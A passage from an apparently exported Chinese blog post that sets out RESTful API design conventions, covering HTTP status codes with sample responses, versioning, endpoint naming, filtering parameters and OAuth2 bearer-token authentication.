class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">302</span> Found</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:41:50 GMT</span><br><span class=\"line\"><span class=\"attribute\">Location</span>: https://example.com</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset=\"UTF-8\" /&gt;</span><br><span class=\"line\">        &lt;meta http-equiv=\"refresh\" content=\"0;url=https://example.com\" /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;title&gt;Redirecting to https://example.com&lt;/title&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        Redirecting to &lt;a href=\"https://example.com\"&gt;https://example.com&lt;/a&gt;.</span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>API 一定不可 返回纯 HTML 结构的响应；若一定要使用重定向功能，应该 返回一个响应实体为空的 3xx 响应，并在响应头中加上 Location 字段:</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">302</span> Found</span><br><span class=\"line\"><span class=\"string\">Server:</span> nginx/<span class=\"number\">1.11</span><span class=\"number\">.9</span></span><br><span class=\"line\">Content-<span class=\"string\">Type:</span> text/html; charset=UTF<span class=\"number\">-8</span></span><br><span class=\"line\">Transfer-<span class=\"string\">Encoding:</span> chunked</span><br><span class=\"line\"><span class=\"string\">Date:</span> Sun, <span class=\"number\">24</span> Jun <span class=\"number\">2018</span> <span class=\"number\">09</span>:<span class=\"number\">52</span>:<span class=\"number\">50</span> GMT</span><br><span class=\"line\"><span class=\"string\">Location:</span> <span class=\"string\">https:</span><span class=\"comment\">//godruoyi.com</span></span><br><span class=\"line\"><span class=\"string\">Connection:</span> keep-alive</span><br></pre></td></tr></table></figure>\n<h3 id=\"400-Bad-Request\"><a href=\"#400-Bad-Request\" class=\"headerlink\" title=\"400 Bad Request\"></a>400 Bad Request</h3><p>由于明显的客户端错误（例如，请求语法格式错误、无效的请求、无效的签名等），服务器 应该 放弃该请求。</p>\n<blockquote>\n<p>当服务器无法从其他 4xx 类型的状态码中找出合适的来表示错误类型时，都 必须 返回该状态码。</p>\n</blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">400</span> Bad Request</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 13:22:36 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40000,\"message\":\"无效的签名\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"401-Unauthorized\"><a href=\"#401-Unauthorized\" class=\"headerlink\" title=\"401 Unauthorized\"></a>401 Unauthorized</h3><p>该状态码表示当前请求需要身份认证，以下情况都 必须 返回该状态码。</p>\n<ul>\n<li>未认证用户访问需要认证的 API</li>\n<li>access_token 无效/过期</li>\n<li>客户端在收到 401 响应后，都 应该 提示用户进行下一步的登录操作。</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">401</span> Unauthorized</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">WWW-Authenticate</span>: JWTAuth</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 13:17:02 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">\"message\":\"Token Signature could not be verified.\",\"error_code\": \"40100\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"403-Forbidden\"><a href=\"#403-Forbidden\" class=\"headerlink\" title=\"403 Forbidden\"></a>403 Forbidden</h3><p>该状态码可以简单的理解为没有权限访问该请求，服务器收到请求但拒绝提供服务。</p>\n<p>如当普通用户请求操作管理员用户时，必须 返回该状态码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">403</span> Forbidden</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 13:05:34 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40301,\"message\":\"权限不足\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"404-Not-Found\"><a href=\"#404-Not-Found\" class=\"headerlink\" title=\"404 Not Found\"></a>404 Not Found</h3><p>该状态码表示用户请求的资源不存在，如</p>\n<ul>\n<li>获取不存在的用户信息 （get /users/9999999）</li>\n<li>访问不存在的端点</li>\n</ul>\n<p>都 必须 返回该状态码，若该资源已永久不存在，则 应该 返回 401 响应。</p>\n<h3 id=\"405-Method-Not-Allowd\"><a href=\"#405-Method-Not-Allowd\" class=\"headerlink\" title=\"405 Method Not Allowd\"></a>405 Method Not Allowd</h3><p>当客户端使用的 HTTP 请求方法不被服务器允许时，必须 返回该状态码。</p>\n<blockquote>\n<p>如客户端调用了 POST 方法来访问只支持 GET 方法的 API</p>\n</blockquote>\n<p>该响应 必须 返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">405</span> Method Not Allowed</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Allow</span>: GET, HEAD</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 12:30:57 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"message\":\"405 Method Not Allowed\",\"error_code\": 40500&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"406-Not-Acceptable\"><a href=\"#406-Not-Acceptable\" class=\"headerlink\" title=\"406 Not Acceptable\"></a>406 Not Acceptable</h3><p>API 在不支持客户端指定的数据格式时，应该返回此状态码。如支持 JSON 和 XML 输出的 API 被指定返回 YAML 格式的数据时。</p>\n<blockquote>\n<p>Http 协议一般通过请求首部的 Accept 来指定数据格式</p>\n</blockquote>\n<h3 id=\"408-Request-Timeout\"><a href=\"#408-Request-Timeout\" class=\"headerlink\" title=\"408 Request Timeout\"></a>408 Request Timeout</h3><p>客户端请求超时时 必须 返回该状态码，需要注意的时，该状态码表示 客户端请求超时，在涉及第三方 API 调用超时时，一定不可 返回该状态码。</p>\n<h3 id=\"409-Gonfilct\"><a href=\"#409-Gonfilct\" class=\"headerlink\" title=\"409 Gonfilct\"></a>409 Gonfilct</h3><p>该状态码表示因为请求存在冲突无法处理。如通过手机号码提供注册功能的 API，当用户提交的手机号已存在时，必须 返回此状态码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">409</span> Conflict</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 12:19:04 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40900,\"message\":\"手机号已存在\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"410-Gone\"><a href=\"#410-Gone\" class=\"headerlink\" title=\"410 Gone\"></a>410 Gone</h3><p>和 404 类似，该状态码也表示请求的资源不存在，只是 410 状态码进一步表示所请求的资源已不存在，并且未来也不会存在。在收到 410 状态码后，客户端 应该 停止再次请求该资源。</p>\n<h3 id=\"413-Request-Entity-Too-Large\"><a href=\"#413-Request-Entity-Too-Large\" class=\"headerlink\" title=\"413 Request Entity Too Large\"></a>413 Request Entity Too Large</h3><p>该状态码表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。</p>\n<blockquote>\n<p>此种情况下，服务器可以关闭连接以免客户端继续发送此请求。</p>\n</blockquote>\n<p>如果这个状况是临时的，服务器 应该 返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</p>\n<h3 id=\"414-Request-URI-Too-Long\"><a href=\"#414-Request-URI-Too-Long\" class=\"headerlink\" title=\"414 Request-URI Too Long\"></a>414 Request-URI Too Long</h3><p>该状态码表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。</p>\n<h3 id=\"415-Unsupported-Media-Type\"><a href=\"#415-Unsupported-Media-Type\" class=\"headerlink\" title=\"415 Unsupported Media Type\"></a>415 Unsupported Media Type</h3><p>通常表示服务器不支持客户端请求首部 Content-Type 指定的数据格式。如在只接受 JSON 格式的 API 中放入 XML 类型的数据并向服务器发送，都 应该 返回该状态码。</p>\n<p>该状态码也可用于如：只允许上传图片格式的文件，但是客户端提交媒体文件非法或不是图片类型，这时 应该 返回该状态码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">415</span> Unsupported Media Type</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 12:09:40 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":41500,\"message\":\"不允许上传的图片格式\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"429-Too-Many-Request\"><a href=\"#429-Too-Many-Request\" class=\"headerlink\" title=\"429 Too Many Request\"></a>429 Too Many Request</h3><p>该状态码表示用户请求次数超过允许范围。如 API 设定为 60次/分钟，当用户在一分钟内请求次数超过 60 次后，都 应该 返回该状态码。并且也 应该 在响应首部中加上下列头部：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-RateLimit-<span class=\"string\">Limit:</span> <span class=\"number\">10</span> 请求速率（由应用设定，其单位一般为小时<span class=\"regexp\">/分钟等，这里是 10次/</span><span class=\"number\">5</span>分钟）</span><br><span class=\"line\">X-RateLimit-<span class=\"string\">Remaining:</span> <span class=\"number\">0</span> 当前剩余的请求数量</span><br><span class=\"line\">X-RateLimit-<span class=\"string\">Reset:</span> <span class=\"number\">1529839462</span> 重置时间</span><br><span class=\"line\">Retry-<span class=\"string\">After:</span> <span class=\"number\">120</span> 下一次访问应该等待的时间（秒）</span><br></pre></td></tr></table></figure>\n<p>列子</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">429</span> Too Many Requests</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">X-RateLimit-Limit</span>: 10</span><br><span class=\"line\"><span class=\"attribute\">X-RateLimit-Remaining</span>: 0</span><br><span class=\"line\"><span class=\"attribute\">X-RateLimit-Reset</span>: 1529839462</span><br><span class=\"line\"><span class=\"attribute\">Retry-After</span>: 290</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 11:19:32 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"message\":\"You have exceeded your rate limit.\",\"error_code\":42900&#125;</span><br></pre></td></tr></table></figure>\n<p>必须 为所有的 API 设置 Rate Limit 支持。</p>\n<h3 id=\"500-Internal-Server-Error\"><a href=\"#500-Internal-Server-Error\" class=\"headerlink\" title=\"500 Internal Server Error\"></a>500 Internal Server Error</h3><p>该状态码 必须 在服务器出错时抛出，对于所有的 500 错误，都 应该 提供完整的错误信息支持，也方便跟踪调试。</p>\n<h3 id=\"503-Service-Unavailable\"><a href=\"#503-Service-Unavailable\" class=\"headerlink\" title=\"503 Service Unavailable\"></a>503 Service Unavailable</h3><p>该状态码表示服务器暂时处理不可用状态，当服务器需要维护或第三方 API 请求超时/不可达时，都 应该 返回该状态码，其中若是主动关闭 API 服务，应该在返回的响应首部加上 Retry-After 头部，表示多少秒后可以再次访问。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">503</span> Service Unavailable</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 10:56:20 GMT</span><br><span class=\"line\"><span class=\"attribute\">Retry-After</span>: 60</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":50300,\"message\":\"服务维护中\"&#125;</span><br></pre></td></tr></table></figure>\n<p>其他 HTTP 状态码请参考 <a href=\"https://link.juejin.im/?target=https%3A%2F%2Fzh.wikipedia.org%2Fzh-hans%2FHTTP%25E7%258A%25B6%25E6%2580%2581%25E7%25A0%2581\" target=\"_blank\" rel=\"noopener\">HTTP 状态码- 维基百科</a>。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>工欲善其事，必先利其器，一个健壮的API必要有优秀的设计规范，本文是最基本的设计理念</p>","more":"<h3 id=\"协议\"><a href=\"#协议\" class=\"headerlink\" title=\"协议\"></a>协议</h3><p>在通过 API 于后端服务通信的过程中，应该 使用 HTTPS 协议。</p>\n<h3 id=\"API-Root-URL\"><a href=\"#API-Root-URL\" class=\"headerlink\" title=\"API Root URL\"></a>API Root URL</h3><p>API 的根入口点应尽可能保持足够简单，这里有两个常见的 URL 根例子：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">api<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">example.com/api/*</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果你的应用很庞大或者你预计它将会变的很庞大，那 应该 将 API 放到子域下。这种做法可以保持某些规模化上的灵活性。</p>\n</blockquote>\n<h3 id=\"Versioning\"><a href=\"#Versioning\" class=\"headerlink\" title=\"Versioning\"></a>Versioning</h3><p>所有的 API 必须保持向后兼容，你 必须 在引入新版本 API 的同时确保旧版本 API 仍然可用。所以 应该 为其提供版本支持。</p>\n<p>目前比较常见的两种版本号形式：</p>\n<p>在 URL 中嵌入版本编号<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">api<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span>/v1<span class=\"comment\">/*</span></span><br></pre></td></tr></table></figure></p>\n<p>这种做法是版本号直观、易于调试；另一种做法是，将版本号放在 HTTP Header 头中：<br>通过媒体类型来指定版本信息<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept: application/vnd<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span><span class=\"selector-class\">.v1</span>+json</span><br></pre></td></tr></table></figure></p>\n<p>其中 vnd 表示 Standards Tree 标准树类型，有三个不同的树: x，prs 和 vnd。你使用的标准树需要取决于你开发的项目</p>\n<ul>\n<li>未注册的树（x）主要表示本地和私有环境</li>\n<li>私有树（prs）主要表示没有商业发布的项目</li>\n<li>供应商树（vnd）主要表示公开发布的项目</li>\n</ul>\n<blockquote>\n<p>后面几个参数依次为应用名称（一般为应用域名）、版本号、期望的返回格式。</p>\n</blockquote>\n<h3 id=\"Endpoints\"><a href=\"#Endpoints\" class=\"headerlink\" title=\"Endpoints\"></a>Endpoints</h3><p>端点就是指向特定资源或资源集合的 URL。在端点的设计中，你 必须 遵守下列约定:</p>\n<ul>\n<li>URL 的命名 必须 全部小写</li>\n<li>URL 中资源（resource）的命名 必须 是名词，并且 必须 是复数形式</li>\n<li>必须 优先使用 Restful 类型的 URL</li>\n<li>URL 中不能出现 -，必须 用下划线 _ 代替</li>\n<li>URL 必须 是易读的</li>\n<li>URL 一定不可 暴露服务器架构</li>\n</ul>\n<h3 id=\"HTTP-动词\"><a href=\"#HTTP-动词\" class=\"headerlink\" title=\"HTTP 动词\"></a>HTTP 动词</h3><p>对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。</p>\n<ul>\n<li>GET（SELECT）：从服务器取出资源（一项或多项）。</li>\n<li>POST（CREATE）：在服务器新建一个资源。</li>\n<li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</li>\n<li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</li>\n<li>DELETE（DELETE）：从服务器删除资源。</li>\n</ul>\n<h3 id=\"Filtering\"><a href=\"#Filtering\" class=\"headerlink\" title=\"Filtering\"></a>Filtering</h3><blockquote>\n<p>如果记录数量很多，服务器不可能都将它们返回给用户。API 应该 提供参数，过滤返回结果。下面是一些常见的参数。</p>\n</blockquote>\n<ul>\n<li>?limit=10：指定返回记录的数量</li>\n<li>?offset=10：指定返回记录的开始位置。</li>\n<li>?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</li>\n<li>?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</li>\n<li>?animal_type_id=1：指定筛选条件</li>\n</ul>\n<p>所有 URL 参数 必须 是全小写，必须 使用下划线类型的参数形式。</p>\n<p>经常使用的、复杂的查询 应该 标签化，降低维护成本。如</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"builtin-name\">GET</span> /trades?<span class=\"attribute\">status</span>=closed&amp;sort=sortby=name&amp;order=asc</span><br><span class=\"line\"><span class=\"comment\"># 可为其定制快捷方式</span></span><br><span class=\"line\"><span class=\"builtin-name\">GET</span> /trades/recently_closed</span><br></pre></td></tr></table></figure>\n<h3 id=\"Authentication\"><a href=\"#Authentication\" class=\"headerlink\" title=\"Authentication\"></a>Authentication</h3><p>应该 使用 OAuth2.0 的方式为 API 调用者提供登录认证。必须 先通过登录接口获取 Access Token 后再通过该 token 调用需要身份认证的 API。</p>\n<p>Oauth 的端点设计示列</p>\n<ul>\n<li>RFC 6749   /token</li>\n<li>Twitter    /oauth2/token</li>\n<li>Fackbook   /oauth/access_token</li>\n<li>Google     /o/oauth2/token</li>\n<li>Github     /login/oauth/access_token</li>\n<li>Instagram  /oauth/authorize</li>\n</ul>\n<p>客户端在获得 access token 的同时 必须 在响应中包含一个名为 expires_in 的数据，它表示当前获得的 token 会在多少 秒 后失效。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"access_token\"</span>: <span class=\"string\">\"token....\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"token_type\"</span>: <span class=\"string\">\"Bearer\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"expires_in\"</span>: <span class=\"number\">3600</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>客户端在请求需要认证的 API 时，必须 在请求头 Authorization 中带上 access_token。</p>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">Authorization</span>: <span class=\"keyword\">Bearer </span>token...</span><br></pre></td></tr></table></figure>\n<p>当超过指定的秒数后，access token 就会过期，再次用过期/或无效的 token 访问时，服务端 应该 返回 invalid_token 的错误或 401 错误码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">401</span> Unauthorized</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-store</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    \"error\": \"invalid_token\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Laravel 开发中，应该 使用 JWT 来为管理你的 Token，并且 一定不可 在 api 中间件中开启请求 session。</p>\n</blockquote>\n<h3 id=\"Response\"><a href=\"#Response\" class=\"headerlink\" title=\"Response\"></a>Response</h3><p>所有的 API 响应，必须 遵守 HTTP 设计规范，必须 选择合适的 HTTP 状态码。一定不可 所有接口都返回状态码为 200 的 HTTP 响应，如:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">200</span> ok</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: example.com</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    \"code\": 0,</span><br><span class=\"line\">    \"msg\": \"success\",</span><br><span class=\"line\">    \"data\": &#123;</span><br><span class=\"line\">        \"username\": \"username\"</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>常见的 HTTP 状态码</p>\n<table>\n<thead>\n<tr>\n<th>状态码</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1xx</td>\n<td>代表请求已被接受，需要继续处理</td>\n</tr>\n<tr>\n<td>2xx</td>\n<td>请求已成功，请求所希望的响应头或数据体将随此响应返回</td>\n</tr>\n<tr>\n<td>3xx</td>\n<td>重定向</td>\n</tr>\n<tr>\n<td>4xx</td>\n<td>客户端引起的错误</td>\n</tr>\n<tr>\n<td>5xx</td>\n<td>服务端引起的错误</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>只有来自客户端的请求被正确的处理后才能返回 2xx 的响应，所以当 API 返回 2xx 类型的状态码时，前端 必须 认定该请求已处理成功。</p>\n</blockquote>\n<p>必须强调的是，所有 API 一定不可 返回 1xx 类型的状态码。当 API 发生错误时，必须 返回出错时的详细信息。目前常见返回错误信息的方法有两种：</p>\n<p>1、将错误详细放入 HTTP 响应首部；</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-MYNAME-<span class=\"built_in\">ERROR</span>-<span class=\"built_in\">CODE</span>: <span 